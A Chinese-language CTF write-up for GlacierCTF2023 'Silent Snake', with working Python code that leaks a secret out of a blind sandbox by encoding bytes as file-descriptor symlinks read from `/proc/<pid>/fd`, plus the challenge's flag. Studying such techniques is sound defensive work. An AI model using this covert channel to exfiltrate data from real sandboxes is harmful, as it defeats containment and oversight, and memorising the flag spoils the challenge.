# GlacierCTF2023 - Silent Snake

## 题目简述

玩家获得一个可执行任意 Python 的盲 REPL，但 stdout/stderr 已关闭、文件系统只读、PID 数量受限，且只能通过独立命令进程执行一次 `ls -l <directory>`。flag 可读却无法直接打印，目标是构造可被这一次目录列表观察到的隐蔽信道。

## 解题过程

`/proc/<pid>/fd/` 是动态的：进程每个打开的文件描述符都会显示为指向实际文件的符号链接。先从 `/bin`、`/usr/bin`、`/sbin` 收集至少 256 个不同的真实路径；必须先 `realpath` 并去重，否则 `sh -> bash` 一类别名会让同一目标对应多个字节。

把字节值 $0\ldots255$ 编码到 fd 100 至 355：

```python
for value in range(256):
    fd = os.open(files[value], os.O_RDONLY)
    os.dup2(fd, 100 + value)
    os.close(fd)
```

读取 flag 后，对第 $i$ 个字符，把代表其码点的描述符复制到 `1000 + i`：

```python
with open("flag.txt", "r") as f:
    flag = f.read()

for i, ch in enumerate(flag):
    os.dup2(100 + ord(ch), 1000 + i)

run_command(f"ls /proc/{os.getpid()}/fd")
```

`run_command` 只是把这条两段式命令交给独立命令服务；服务确认参数是目录后，实际执行的是 `ls -l /proc/<pid>/fd`，所以输出中带有符号链接目标。唯一一次长列表同时包含“码表区”和“消息区”。本地解析每行的 `fd -> realpath`，先由 100..355 建立路径到字节的反向表，再按 1000、1001……恢复字符，得到：

```text
gctf{2nd_f100r_ba5ement?_p5ych0_mant15?_pr0cf5?}
```

仓库还记录了一个非预期解：服务未限制连接次数，可以每次连接泄漏一个字符。上面的 procfs/fd 编码才是单连接、单次 `ls` 的预期路线。

## 方法总结

关闭标准输出并不等于没有输出通道。进程数量、文件描述符、符号链接目标、退出时序等可观察状态都能编码数据；限制型沙箱需要同时考虑 procfs 暴露与辅助进程的输出权限，而不能只封禁文件写入和 `print`。
